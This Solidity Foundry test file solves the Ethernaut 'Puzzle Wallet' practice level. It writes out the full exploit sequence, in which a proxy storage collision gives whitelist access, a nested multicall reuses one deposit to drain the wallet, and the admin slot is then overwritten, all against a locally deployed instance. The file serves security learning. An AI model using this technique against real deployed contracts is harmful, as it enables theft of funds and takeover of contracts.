// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/PuzzleWallet/PuzzleWalletFactory.sol";

contract PuzzleWalletTest is StdCheats, Test {
    address eoaAddress = address(100);

    // Memory cannot hold dynamic byte arrays must be storage
    bytes[] depositData = [abi.encodeWithSignature("deposit()")];
    bytes[] multicallData =
        [abi.encodeWithSignature("deposit()"), abi.encodeWithSignature("multicall(bytes[])", depositData)];

    event IsTrue(bool answer);

    function setUp() public {
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testPuzzleWalletHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PuzzleWalletFactory puzzleWalletFactory = new PuzzleWalletFactory();
        (address levelAddressProxy, address levelAddressWallet) = puzzleWalletFactory.createInstance{value: 1 ether}();
        PuzzleProxy ethernautPuzzleProxy = PuzzleProxy(payable(levelAddressProxy));
        PuzzleWallet ethernautPuzzleWallet = PuzzleWallet(payable(levelAddressWallet));

        vm.startPrank(eoaAddress);

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        ethernautPuzzleProxy.proposeNewAdmin(eoaAddress);
        ethernautPuzzleWallet.addToWhitelist(eoaAddress);
        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSignature("deposit()");
        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSignature("deposit()");
        data[1] = abi.encodeWithSignature("multicall(bytes[])", depositData);
        ethernautPuzzleWallet.multicall{value: 1 ether}(data);
        ethernautPuzzleWallet.execute(eoaAddress, address(ethernautPuzzleProxy).balance, "");
        ethernautPuzzleWallet.setMaxBalance(uint256(uint160(eoaAddress)));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        // Verify We have become admin
        assertTrue((ethernautPuzzleProxy.admin() == eoaAddress));
        vm.stopPrank();
    }
}
